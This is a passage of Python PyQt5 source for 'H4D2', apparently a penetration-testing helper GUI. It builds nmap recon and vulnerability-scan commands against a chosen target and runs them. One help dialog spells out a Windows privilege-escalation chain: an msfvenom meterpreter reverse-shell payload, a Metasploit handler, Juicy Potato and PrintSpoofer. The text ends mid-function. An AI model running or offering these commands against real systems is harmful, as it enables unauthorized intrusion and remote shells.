#!/usr/bin/env python3
import sys
import os
from PyQt5.QtCore import *
from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
import subprocess
import re

class CheckableComboBox(QComboBox):
    def __init__(self):
        super(CheckableComboBox, self).__init__()
        self.setModel(QStandardItemModel(self))

class MainWindow(QMainWindow):

    def __init__(self):
        super().__init__()
        self.stacked_widget = QStackedWidget()
        self.setCentralWidget(self.stacked_widget)
        self.widgets = {}
        self.lhost = "127.0.0.1"
        self.rhost = ""
        self.rport = "-"
        self.lport = "4444"
            
        # Create home page
        self.home_page = QWidget()
        
        #create QLabel and set its pixmap
        self.image = QLabel()
        self.image.setPixmap(QPixmap("/opt/H4D2/Icons/logo2.png"))
        self.image.setAlignment(Qt.AlignCenter)
        self.start_button = QPushButton("Start")
        self.start_button.clicked.connect(self.show_main_page)
        self.start_button.clicked.connect(self.recon)
        
        # create a main layout 
        layout = QVBoxLayout()
        # create a horizontal layout for the image
        layout.addStretch()
        layout.addWidget(self.image, 0, Qt.AlignCenter)
        layout.addStretch()
        # create a vertical layout for the button
        self.start_button.setFixedSize(150,50)
        self.start_button.setStyleSheet("QPushButton { border: 2px solid green; }"
                                "QPushButton:hover { background-color: green;}")
        layout.addWidget(self.start_button, 0, Qt.AlignBottom | Qt.AlignCenter)
        layout.addStretch()
        self.home_page.setLayout(layout)
        self.stacked_widget.addWidget(self.home_page)

        # Create main page
        self.main_page = QWidget()
        
        # Set up the user interface
        self.setStyleSheet('background: #161219;')
        self.setWindowTitle('H4D2')
        self.setWindowIcon(QIcon('/opt/H4D2/Icons/h4d2_icon.png'))
        self.setGeometry(1200, 0, 1000, 600)
        self.tabs = QTabWidget()
        self.tabs.setMovable(True)
        self.tabs.tabBar().setStyleSheet("QTabBar::tab:selected { background-color: #20C20E}")

        # Create tabs
        self.tab1 = QWidget()
        self.tab2 = QWidget()
        self.tab3 = QWidget()
        self.tab4 = QWidget()
        self.tab5 = QWidget()
        self.tab6 = QWidget()
        self.tab7 = QWidget()
        self.tab8 = QWidget()
        self.tabs.addTab(self.tab1, "Initial Recon")
        self.tabs.addTab(self.tab2, "HTTPHelper")
        self.tabs.addTab(self.tab3, "Linux Priv Esc")
        self.tabs.addTab(self.tab4, "Windows Priv Esc")
        self.tabs.addTab(self.tab5, "TTY Shell Breakout")
        self.tabs.addTab(self.tab6, "RevShells")
        self.tabs.addTab(self.tab7, "MSFVenom")
        self.tabs.addTab(self.tab8, "SMBHelper")
        self.tabs.currentChanged.connect(self.tabChanged)

        # Create a settings button
        self.settings_button = QPushButton()
        self.settings_button.setIcon(QIcon("/opt/H4D2/Icons/settings_icon.png"))
        self.settings_button.setIconSize(QSize(15,15))
        self.settings_button.clicked.connect(self.show_settings)

        # Add dropdown and labels to layout
        main_layout = QVBoxLayout()
        main_layout.addWidget(self.settings_button, 0, Qt.AlignLeft)
        main_layout.addWidget(self.tabs)
        self.main_page.setLayout(main_layout)
        self.stacked_widget.addWidget(self.main_page)

    def show_help_window(self, help_text, help_title_text):
        self.help_window_popup = QDialog(self)
        self.help_window_popup.setStyleSheet("background-color: #161219;")        
        
        # Create the scroll area
        self.scroll_area = QScrollArea()
        self.scroll_area.setWindowIcon(QIcon('/opt/H4D2/Icons/settings_icon.png'))
        self.scroll_area.setWindowTitle("Help Menu")
        self.scroll_area.setWidgetResizable(True)
        self.scroll_area.setWidget(self.help_window_popup)

        # Create the top_spacers and horizontal top_line
        top_spacer1 = QLabel()
        top_spacer2 = QLabel()
        top_line = QFrame()
        top_line.setFrameShape(QFrame.HLine)
        top_line.setFrameShadow(QFrame.Sunken)
       
        # Add the help text to the popup layout
        help_title = QLabel(help_title_text)
        help_title.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )

        help_label = QLabel(help_text)
        help_label.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )

        help_label.setWordWrap(True)
        self.popup_layout = QVBoxLayout()
        self.popup_layout.addWidget(help_title)
        self.popup_layout.addWidget(help_label)
        self.popup_layout.addStretch()

        # Set the layout for the settings popup
        self.help_window_popup.setLayout(self.popup_layout)
        self.scroll_area.resize(500, 600)
        self.scroll_area.show()
    
        # Show the settigns popup
        self.help_window_popup.exec_()
        
    def wpe_0_Scan1_Help_Text(self):
        help_title_text = "Whoami"
        help_text = "\ncommand-line tool in Windows used for displaying the current user context and privileges under which the current process is executing" 
        self.show_help_window(help_text, help_title_text)
    
    def wpe_0_Scan2_Help_Text(self):
        help_title_text = "echo %username%"
        help_text = "\nThis command is used to display the username of the currently logged-in user in the Windows command prompt"
        self.show_help_window(help_text, help_title_text)

    def wpe_1_Scan1_Help_Text(self):
        help_title_text = "whoami /priv"
        help_text = "\nSeImpersonatePrivilege Enabled - This privilege allows a user to impersonate another user or process, which could be used to bypass access controls or gain unauthorized access to resources\n\nExploit - Juicy Potato\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f exe > shell.exe\nmsfconsole -x \"use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST " + self.lhost + ";set LPORT " + self.lport + ";run;\"\nJuicy.Potato.x86.exe -l " + self.lport + " -p C:\path\\to\\shell.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}\n\nExploit - PrintSpoofer\n.\PrintSpoofer64.exe -i -c cmd.exe"
        self.show_help_window(help_text, help_title_text)

    def show_settings(self):
        self.settings_popup = QDialog(self)
        self.settings_popup.setStyleSheet("background-color: #161219;")        
        
        # Create the scroll area
        self.scroll_area = QScrollArea()
        self.scroll_area.setWindowIcon(QIcon('/opt/H4D2/Icons/settings_icon.png'))
        self.scroll_area.setWindowTitle("Settings")
        self.scroll_area.setWidgetResizable(True)
        self.scroll_area.setWidget(self.settings_popup)

        # Create the top_spacers and horizontal top_line
        top_spacer1 = QLabel()
        top_spacer2 = QLabel()
        top_line = QFrame()
        top_line.setFrameShape(QFrame.HLine)
        top_line.setFrameShadow(QFrame.Sunken)

### Lhost Setup
        # Create a horizontal layout for the Lhost label and dropdown
        self.lhost_title_layout = QHBoxLayout()
        self.lhost_title = QLabel("Select the Interface you want to set as your IP address")
        self.lhost_title.setStyleSheet("color: 'white'; font-weight: bold")
        self.lhost_layout = QHBoxLayout()
        self.lhost_label = QLabel("Lhost:" + self.lhost)
        self.lhost_label.setStyleSheet("color: 'white'; font-size: 16px;")
        self.lhost_combo = QComboBox()
        self.lhost_combo.setFixedWidth(150)
        self.lhost_combo.activated[str].connect(self.onActivated)
        
        # Get the list of available interfaces
        interfaces = subprocess.check_output("ip link show", shell=True)
        interface_list = interfaces.decode().split("\n")

        # Extract the interface names and add them to the dropdown
        for interface in interface_list:
            if ": <" in interface:
                self.lhost_combo.addItem(interface.split(":")[1].strip())

        # Create the lhost_spacers and horizontal lhost_line
        lhost_spacer1 = QLabel()
        lhost_spacer2 = QLabel()
        lhost_line = QFrame()
        lhost_line.setFrameShape(QFrame.HLine)
        lhost_line.setFrameShadow(QFrame.Sunken)

### Rhost Setup
        rhosts = []
        H4D2_directory = os.path.join('/opt', "H4D2")
        rhosts_file_path = os.path.join(H4D2_directory, "rhosts.txt")
        if os.path.exists(H4D2_directory) and os.access(H4D2_directory, os.R_OK):
            if os.path.isfile(rhosts_file_path):
                try:
                    with open("/opt/H4D2/rhosts.txt", "r") as rhosts_file:
                        rhosts = rhosts_file.read().split("\n")
                    rhosts = list(set(rhosts))
                    rhosts = sorted(filter(None, rhosts), key=lambda x: (len(x), x))

                    rhosts_file.close()
                except IOError:
                    print("rhosts.txt not found.")
                except:
                    print("An error occurred while reading rhosts.txt.")
            else:
                try:
                    with open("/opt/H4D2/rhosts.txt", "w") as rhosts_file:
                        rhosts_file.write("")
                except:
                    print("An error occurred while creating rhosts.txt.")
        else:
            print("H4D2 directory not found or permission denied.")

        # Create a horizontal layout for the Rhost label and dropdown
        self.rhost_title_layout = QHBoxLayout()
        self.rhost_title = QLabel("Select the IP associated with remote target machine")
        self.rhost_title.setStyleSheet("color: 'white'; font-weight: bold")
        self.rhost_layout = QHBoxLayout()
        self.rhost_label = QLabel("          Rhost:")
        self.rhost_label.setStyleSheet("color: 'white'; font-size: 16px;")
        self.rhost_combo = QComboBox()
        self.rhost_combo.setFixedSize(100, 25)
        self.rhost_combo.activated[str].connect(self.onActivated2)
        
        # Add the rhosts to the dropdown
        for rhost in rhosts:
            self.rhost_combo.addItem(rhost)
        
        # Add rhost ip user input
        self.rhost_layout = QHBoxLayout()
        self.rhost_input = QLineEdit()
        self.rhost_input.setFixedWidth(150) 
        self.rhost_input.setPlaceholderText("RHOST")
        self.rhost_input.setAlignment(Qt.AlignCenter) 

        # rhost validate IP
        rhost_validator = QRegExpValidator(QRegExp('^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'))
        self.rhost_input.setValidator(rhost_validator)

        # rhost add IP button
        self.rhost_add_button = QPushButton("Add")
        self.rhost_add_button.setFixedWidth(50) 
        self.rhost_add_button.clicked.connect(lambda: self.add_rhost(rhosts_file))

        # Create the rhost_spacers and horizontal rhost_line
        rhost_spacer1 = QLabel()
        rhost_spacer2 = QLabel()
        rhost_line = QFrame()
        rhost_line.setFrameShape(QFrame.HLine)
        rhost_line.setFrameShadow(QFrame.Sunken)

### rport Setup
        i = 0
        H4D2_directory = os.path.join('/opt', "H4D2")
        rports_file_path = os.path.join(H4D2_directory, "rports.txt")
        if os.path.exists(H4D2_directory) and os.access(H4D2_directory, os.R_OK):
            if os.path.isfile(rports_file_path):
                try:
                    with open("/opt/H4D2/rports.txt", "r") as rports_file:
                        rports = [line.strip() for line in rports_file]
                        
                        rports = list(set(rports))
                        rports = ["-"] + sorted(filter(None, rports), key=lambda x: (len(x), x))
                        for rport in rports:
                            self.rport_combo.addItem(rport)
                            item = self.rport_combo.model().item(i, 0)
                            item.setCheckState(Qt.Unchecked)
                            i += 1               
                except IOError:
                    print("rports.txt not found.")
                except:
                    pass
            else:
                try:
                    with open("/opt/H4D2/rports.txt", "w") as rports_file:
                        rports_file.write("")
                except:
                    print("An error occurred while creating rports.txt.")
        else:
            print("H4D2 directory not found or permission denied.")

        # Create a horizontal layout for the rport label and dropdown
        self.rport_title_layout = QHBoxLayout()
        self.rport_title = QLabel("Select the ports associated with remote target machine")
        self.rport_title.setStyleSheet("color: 'white'; font-weight: bold")
        self.rport_layout = QHBoxLayout()
        self.rport_label = QLabel("         Rport:")
        self.rport_label.setStyleSheet("color: 'white'; font-size: 16px;")
        self.rport_combo = CheckableComboBox()
        self.rport_combo.setFixedSize(100, 25)
        self.rport_combo.view().pressed.connect(self.handleItemPressed)
        self.rport_combo.view().pressed.connect(self.onActivated3)
        
        # Add the rports to the dropdown
        for rport in rports:
            self.rport_combo.addItem(rport)

        # Add rport user input
        self.rport_layout = QHBoxLayout()
        self.rport_input = QLineEdit()
        self.rport_input.setFixedWidth(150) 
        self.rport_input.setPlaceholderText("RPORT")
        self.rport_input.setAlignment(Qt.AlignCenter) 

        # rport number validation
        rport_validator = QRegExpValidator(QRegExp('^([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$'))
        self.rport_input.setValidator(rport_validator)
        
        # rport add button
        self.rport_add_button = QPushButton("Add")
        self.rport_add_button.setFixedWidth(50) 
        self.rport_add_button.clicked.connect(lambda: self.add_rport(rports_file))

        # Create the rport_spacers and horizontal rport_line
        rport_spacer1 = QLabel()
        rport_spacer2 = QLabel()
        rport_line = QFrame()
        rport_line.setFrameShape(QFrame.HLine)
        rport_line.setFrameShadow(QFrame.Sunken)

### lport Setup
        lports = []
        H4D2_directory = os.path.join('/opt', "H4D2")
        lports_file_path = os.path.join(H4D2_directory, "lports.txt")
        if os.path.exists(H4D2_directory) and os.access(H4D2_directory, os.R_OK):
            if os.path.isfile(lports_file_path):
                try:
                    with open("/opt/H4D2/lports.txt", "r") as lports_file:
                        lports = lports_file.read().split("\n")
                    
                    lports = list(set(lports))
                    lports = sorted(filter(None, lports), key=lambda x: (len(x), x))
                    lports_file.close()
                except IOError:
                    print("lports.txt not found.")
                except:
                    print("An error occurred while reading lports.txt.")
            else:
                try:
                    with open("/opt/H4D2/lports.txt", "w") as lports_file:
                        lports_file.write("")
                except:
                    print("An error occurred while creating lports.txt.")
        else:
            print("H4D2 directory not found or permission denied.")
        # Create a horizontal layout for the lport label and dropdown
        self.lport_title_layout = QHBoxLayout()
        self.lport_title = QLabel("Select the port you would like to use with your local machine")
        self.lport_title.setStyleSheet("color: 'white'; font-weight: bold")
        self.lport_layout = QHBoxLayout()
        self.lport_label = QLabel("Lport:")
        self.lport_label.setStyleSheet("color: 'white'; font-size: 16px;")
        self.lport_combo = CheckableComboBox()
        self.lport_combo.setFixedSize(100, 25)
        self.lport_combo.activated[str].connect(self.onActivated4)

        # Add the lports to the dropdown
        for lport in lports:
            self.lport_combo.addItem(lport)
        
        # Add lport  user input
        self.lport_layout = QHBoxLayout()
        self.lport_input = QLineEdit()
        self.lport_input.setFixedWidth(150) 
        self.lport_input.setPlaceholderText("LPORT")
        self.lport_input.setAlignment(Qt.AlignCenter) 

        # lport number validation
        lport_validator = QRegExpValidator(QRegExp('^([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$'))
        self.lport_input.setValidator(lport_validator)
        
        # lport add button
        self.lport_add_button = QPushButton("Add")
        self.lport_add_button.setFixedWidth(50) 
        self.lport_add_button.clicked.connect(lambda: self.add_lport(lports_file))

        # Create a refresh button
        self.refresh_button = QPushButton()
        self.refresh_button.setIcon(QIcon.fromTheme("view-refresh"))
        self.refresh_button.setIconSize(QSize(24, 24))
        self.refresh_button.setFixedSize(QSize(24, 24))
        self.refresh_button.clicked.connect(self.refresh_interfaces)

        # Create the lport_spacers and horizontal lport_line
        lport_spacer1 = QLabel()
        lport_spacer2 = QLabel()
        lport_line = QFrame()
        lport_line.setFrameShape(QFrame.HLine)
        lport_line.setFrameShadow(QFrame.Sunken)

        # Add dropdown and labels to layout
        self.lhost_title_layout.addWidget(self.lhost_title)
        self.lhost_layout.addWidget(self.lhost_label)
        self.lhost_layout.addWidget(self.lhost_combo)
        self.lhost_layout.addWidget(self.refresh_button)
        self.lhost_layout.setAlignment(Qt.AlignLeft)
        self.lhost_combo.setCurrentIndex(0)
        self.lhost_layout.addStretch()
        self.rhost_title_layout.addWidget(self.rhost_title)
        self.rhost_layout.addWidget(self.rhost_input)
        self.rhost_layout.addWidget(self.rhost_add_button)
        self.rhost_layout.setAlignment(Qt.AlignLeft)
        self.rhost_layout.addWidget(self.rhost_label)
        self.rhost_layout.addWidget(self.rhost_combo)
        self.rhost_layout.addStretch()
        self.rhost_layout.setAlignment(Qt.AlignLeft)
        self.rhost = self.rhost_combo.currentText()
        self.rhost_combo.setCurrentIndex(0)
        self.rport_title_layout.addWidget(self.rport_title)
        self.rport_layout.addWidget(self.rport_input)
        self.rport_layout.addWidget(self.rport_add_button)
        self.rport_layout.setAlignment(Qt.AlignLeft)
        self.rport_layout.addWidget(self.rport_label)
        self.rport_layout.addWidget(self.rport_combo)
        self.rport_layout.setAlignment(Qt.AlignLeft)
        self.rport_combo.setCurrentIndex(0)
        self.rport_layout.addStretch()
        self.lport_title_layout.addWidget(self.lport_title)
        self.lport_layout.addWidget(self.lport_input)
        self.lport_layout.addWidget(self.lport_add_button)
        self.lport_layout.setAlignment(Qt.AlignLeft)
        self.lport_layout.addWidget(self.lport_label)
        self.lport_layout.addWidget(self.lport_combo)
        self.lport_layout.setAlignment(Qt.AlignLeft)
        self.lport_combo.setCurrentIndex(0)
        self.lport_layout.addStretch()
        self.popup_layout = QVBoxLayout()
        self.popup_layout.addWidget(top_spacer1)
        self.popup_layout.addWidget(top_line)
        self.popup_layout.addWidget(top_spacer2)
        self.popup_layout.addLayout(self.rhost_title_layout)
        self.popup_layout.addLayout(self.rhost_layout)
        self.popup_layout.addWidget(rhost_spacer1)
        self.popup_layout.addWidget(rhost_line)
        self.popup_layout.addWidget(rhost_spacer2)
        self.popup_layout.addLayout(self.rport_title_layout)
        self.popup_layout.addLayout(self.rport_layout)
        self.popup_layout.addWidget(rport_spacer1)
        self.popup_layout.addWidget(rport_line)
        self.popup_layout.addWidget(rport_spacer2)
        self.popup_layout.addLayout(self.lhost_title_layout)
        self.popup_layout.addLayout(self.lhost_layout)
        self.popup_layout.addWidget(lhost_spacer1)
        self.popup_layout.addWidget(lhost_line)
        self.popup_layout.addWidget(lhost_spacer2)
        self.popup_layout.addLayout(self.lport_title_layout)
        self.popup_layout.addLayout(self.lport_layout)
        self.popup_layout.addWidget(lport_spacer1)
        self.popup_layout.addWidget(lport_line)
        self.popup_layout.addWidget(lport_spacer2)
        self.popup_layout.addStretch()
   
        # Set the layout for the settings popup
        self.settings_popup.setLayout(self.popup_layout)
        self.scroll_area.resize(500, 600)
        self.scroll_area.show()
    
        # Show the settigns popup
        self.settings_popup.exec_()
    
    def add_rhost(self, rhosts_file_path):
        new_rhost = self.rhost_input.text()
        if new_rhost:
            self.rhost_combo.addItem(new_rhost)
            self.rhost_input.clear()
            with open("/opt/H4D2/rhosts.txt", "a") as f:
                f.write(new_rhost + "\n")

    def add_rport(self, rports_file_path):
        new_rport = self.rport_input.text()
        if new_rport:
            self.rport_combo.addItem(new_rport)
            self.rport_input.clear()
            with open("/opt/H4D2/rports.txt", "a") as f:
                f.write(new_rport + "\n")

    def add_lport(self, lports_file_path):
        new_lport = self.lport_input.text()
        if new_lport:
            self.lport_combo.addItem(new_lport)
            self.lport_input.clear()
            with open("/opt/H4D2/lports.txt", "a") as f:
                f.write(new_lport + "\n")

    def refresh_interfaces(self):
        # Clear the current list of interfaces in the lhost_combo widget
        self.lhost_combo.clear()

        # Get the updated list of available interfaces
        interfaces = subprocess.check_output("ip link show", shell=True)
        interface_list = interfaces.decode().split("\n")
        
        # Extract the interface names and add them to the dropdown
        for interface in interface_list:
            if ": <" in interface:
                self.lhost_combo.addItem(interface.split(":")[1].strip())

    def onActivated(self, text):
        # Get the IP associated with the selected interface
        ip = subprocess.check_output("ip addr show " + text + " | grep 'inet ' | awk '{print $2}' | cut -d/ -f1", shell=True)
        self.lhost = ip.decode().strip()
        self.lhost_label.setText("Lhost: " + self.lhost)
        self.tabChanged(text)
        
    def onActivated2(self, text):
        self.rhost = text
        self.rhost_label.setText("          Rhost: ")
        self.tabChanged(text)
   
    def handleItemPressed(self, index):
        item = self.rport_combo.model().itemFromIndex(index)
        if index.row() == 0:
            if item.checkState() == Qt.Checked:
                item.setCheckState(Qt.Unchecked)
                self.rport = ','.join([x for x in self.rport.split(',') if x != item.text()])
            else:
                for i in range(1, self.rport_combo.count()):
                    self.rport_combo.model().item(i).setCheckState(Qt.Unchecked)
                item.setCheckState(Qt.Checked)
                self.rport = item.text()
        else:
            if item.checkState() == Qt.Checked:
                item.setCheckState(Qt.Unchecked)
                self.rport = ','.join([x for x in self.rport.split(',') if x != item.text()])
            else:
                self.rport_combo.model().item(0).setCheckState(Qt.Unchecked)
                item.setCheckState(Qt.Checked)
                if self.rport == "":
                    self.rport += item.text()
                else:
                    if self.rport == "-":
                        self.rport = ""
                        self.rport += item.text()
                    else:
                        self.rport += "," + item.text()

    def onActivated3(self, text):
        self.rport_label.setText("         Rport: ")
        self.tabChanged(text)
 
    def onActivated4(self, text):
        self.lport = text
        self.lport_label.setText("         Lport: ")
        self.tabChanged(text)

    def show_main_page(self):
        self.stacked_widget.setCurrentWidget(self.main_page)

    def tabChanged(self, text):
        current_tab = self.tabs.currentIndex()
        if current_tab == 0:
            self.recon()
        elif current_tab == 1:
            self.httphelper()
        elif current_tab == 2:
            self.lpe()
        elif current_tab == 3:
            self.wpe()
        elif current_tab == 4:
            self.tty()
        elif current_tab == 5:
            self.revShells()
        elif current_tab == 6:
            self.msfvenom()
        elif current_tab == 7:
            self.smbhelper()
#### Recon
    def recon(self):
        if not hasattr(self, 'tab1_container'):
            self.tab1_container = QWidget()
            self.tab1_container_layout = QVBoxLayout(self.tab1_container)
            self.tab1_container.setLayout(self.tab1_container_layout)
            self.scroll = QScrollArea()
            self.scroll.setWidget(self.tab1_container)
            self.scroll.setWidgetResizable(True)
            self.tab1_container.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
            self.scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
            self.tab1_container_layout.setContentsMargins(0,0,0,0)
            self.tab1_container.adjustSize()
            self.tab1.setLayout(QVBoxLayout())
            self.tab1.layout().addWidget(self.scroll)
        
        # nmap
        if hasattr(self, 'nmap'):
            self.tab1_container_layout.removeWidget(self.nmap)
            self.nmap.deleteLater()
        self.nmap = QLabel("[+ Nmap]")
        self.nmap.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab1_container_layout.insertWidget(0,self.nmap)

        # nmap Scan1
        if hasattr(self, 'nmap_Scan1'):
            self.tab1_container_layout.removeWidget(self.nmap_Scan1)
            self.nmap_Scan1.deleteLater()
        self.nmap_Scan1 = QLabel(f"nmap -p{self.rport} -sT -sV -A  {self.rhost}")
        self.nmap_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # nmap_Scan1 copy button
        if hasattr(self, 'nmap_Scan1_Copy'):
            self.tab1_container_layout.removeWidget(self.nmap_Scan1_Copy)
            self.nmap_Scan1_Copy.deleteLater()
        self.nmap_Scan1_Copy = QPushButton()
        self.nmap_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.nmap_Scan1_Copy.setFixedSize(QSize(20,20))
        self.nmap_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.nmap_Scan1.text()))
        self.nmap_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # nmap_Scan1 run button
        if hasattr(self, 'nmap_Scan1_Run'):
            self.tab1_container_layout.removeWidget(self.nmap_Scan1_Run)
            self.nmap_Scan1_Run.deleteLater()
        self.nmap_Scan1_Run = QPushButton()
        self.nmap_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.nmap_Scan1_Run.setFixedSize(QSize(20,20))
        command1 = self.nmap_Scan1.text() + "; bash"
        self.nmap_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command1]))
        self.nmap_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # nmap_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.nmap_Scan1_Copy)
        label_layout.addWidget(self.nmap_Scan1_Run)
        label_layout.addWidget(self.nmap_Scan1)
        self.tab1_container_layout.insertLayout(1, label_layout)
        self.tab1_container_layout.addStretch()

        # nmap Scan2
        if hasattr(self, 'nmap_Scan2'):
            self.tab1_container_layout.removeWidget(self.nmap_Scan2)
            self.nmap_Scan2.deleteLater()
        self.nmap_Scan2 = QLabel(f"nmap -p{self.rport} -sC -sV {self.rhost} --open") 
        self.nmap_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # nmap_Scan2 copy button
        if hasattr(self, 'nmap_Scan2_Copy'):
            self.tab1_container_layout.removeWidget(self.nmap_Scan2_Copy)
            self.nmap_Scan2_Copy.deleteLater()
        self.nmap_Scan2_Copy = QPushButton()
        self.nmap_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.nmap_Scan2_Copy.setFixedSize(QSize(20,20))
        self.nmap_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.nmap_Scan2.text()))
        self.nmap_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # nmap_Scan2 run button
        if hasattr(self, 'nmap_Scan2_Run'):
            self.tab1_container_layout.removeWidget(self.nmap_Scan2_Run)
            self.nmap_Scan2_Run.deleteLater()
        self.nmap_Scan2_Run = QPushButton()
        self.nmap_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.nmap_Scan2_Run.setFixedSize(QSize(20,20))
        command1 = self.nmap_Scan2.text() + "; bash"
        self.nmap_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command1]))
        self.nmap_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # nmap_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.nmap_Scan2_Copy)
        label_layout.addWidget(self.nmap_Scan2_Run)
        label_layout.addWidget(self.nmap_Scan2)
        self.tab1_container_layout.insertLayout(2, label_layout)
        self.tab1_container_layout.addStretch()
        
        # nmap Scan3
        if hasattr(self, 'nmap_Scan3'):
            self.tab1_container_layout.removeWidget(self.nmap_Scan3)
            self.nmap_Scan3.deleteLater()
        self.nmap_Scan3 = QLabel(f"nmap -p{self.rport} --script=vuln {self.rhost}")
        self.nmap_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # nmap copy button
        if hasattr(self, 'nmap_Scan3_Copy'):
            self.tab1_container_layout.removeWidget(self.nmap_Scan3_Copy)
            self.nmap_Scan3_Copy.deleteLater()
        self.nmap_Scan3_Copy = QPushButton()
        self.nmap_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.nmap_Scan3_Copy.setFixedSize(QSize(20,20))
        self.nmap_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.nmap_Scan3.text()))
        self.nmap_Scan3_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # nmap run button
        if hasattr(self, 'nmap_Scan3_Run'):
            self.tab1_container_layout.removeWidget(self.nmap_Scan3_Run)
            self.nmap_Scan3_Run.deleteLater()
        self.nmap_Scan3_Run = QPushButton()
        self.nmap_Scan3_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.nmap_Scan3_Run.setFixedSize(QSize(20,20))
        command1 = self.nmap_Scan3.text() + "; bash"
        self.nmap_Scan3_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command1]))
        self.nmap_Scan3_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # nmap_Scan3 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.nmap_Scan3_Copy)
        label_layout.addWidget(self.nmap_Scan3_Run)
        label_layout.addWidget(self.nmap_Scan3)
        self.tab1_container_layout.insertLayout(3, label_layout)
        self.tab1_container_layout.addStretch()
        
        # nmap divider 1
        if hasattr(self, 'nmap_divider1'):
            self.tab1_container_layout.removeWidget(self.nmap_divider1)
            self.nmap_divider1.deleteLater()
        self.nmap_divider1 = QFrame()
        self.nmap_divider1.setFrameShape(QFrame.HLine)
        self.nmap_divider1.setLineWidth(3)
        self.nmap_divider1.setStyleSheet("color: #20C20E;")
        
        # nmap divider2
        if hasattr(self, 'nmap_divider2'):
            self.tab1_container_layout.removeWidget(self.nmap_divider2)
            self.nmap_divider2.deleteLater()
        self.nmap_divider2 = QFrame()
        self.nmap_divider2.setFrameShape(QFrame.HLine)
        self.nmap_divider2.setLineWidth(3)
        self.nmap_divider2.setStyleSheet("color: #20C20E;")
        
        # nmap spacer1
        if hasattr(self, 'nmap_spacer1'):
            self.tab1_container_layout.removeWidget(self.nmap_spacer1)
            self.nmap_spacer1.deleteLater()
        self.nmap_spacer1 = QLabel()
        self.nmap_spacer1.setFixedWidth(40)
        self.nmap_spacer1.setFixedHeight(50)
        
        # nmap spacer2
        if hasattr(self, 'nmap_spacer2'):
            self.tab1_container_layout.removeWidget(self.nmap_spacer2)
            self.nmap_spacer2.deleteLater()
        self.nmap_spacer2 = QLabel()
        self.nmap_spacer2.setFixedWidth(40)
        self.nmap_spacer2.setFixedHeight(50)

        # nmap spacer & divider layout
        self.tab1_container_layout.insertWidget(4, self.nmap_spacer1)
        self.tab1_container_layout.insertWidget(5, self.nmap_divider1)
        self.tab1_container_layout.insertWidget(6, self.nmap_divider2)
        self.tab1_container_layout.insertWidget(7, self.nmap_spacer2)

### HTTPHelper
    def httphelper(self):
        if not hasattr(self, 'tab2_container'):
            self.tab2_container = QWidget()
            self.tab2_container_layout = QVBoxLayout(self.tab2_container)
            self.tab2_container.setLayout(self.tab2_container_layout)
            self.scroll = QScrollArea()
            self.scroll.setWidget(self.tab2_container)
            self.scroll.setWidgetResizable(True)
            self.tab2_container.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
            self.scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
            self.tab2_container_layout.setContentsMargins(0,0,0,0)
            self.tab2_container.adjustSize()
            self.tab2.setLayout(QVBoxLayout())
            self.tab2.layout().addWidget(self.scroll)

        # nmap_methods
        if hasattr(self, 'nmap_methods'):
            self.tab2_container_layout.removeWidget(self.nmap_methods)
            self.nmap_methods.deleteLater()
        self.nmap_methods = QLabel("[+ Nmap HTTP Methods]")
        self.nmap_methods.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(0,self.nmap_methods)
        self.tab2_container_layout.addStretch()
        
        if hasattr(self, 'nmapMethods_Scan1'):
            self.tab2_container_layout.removeWidget(self.nmapMethods_Scan1)
